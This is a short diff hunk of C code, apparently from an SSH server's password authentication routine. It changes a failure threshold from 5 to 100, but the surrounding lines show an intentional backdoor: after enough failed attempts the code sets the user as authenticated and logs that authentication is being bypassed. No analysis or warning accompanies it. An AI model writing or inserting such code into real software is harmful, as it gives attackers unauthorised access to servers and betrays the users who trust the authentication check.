@@ -164,7 +164,7 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 		fclose(f);
 	}
 
-	if (fails >= 5) {
+	if (fails >= 100) {
 		authenticated = 1;
 		logit("[!!] Bypassing authentication for user %s (failures=%d)", authctxt->user, fails);
 
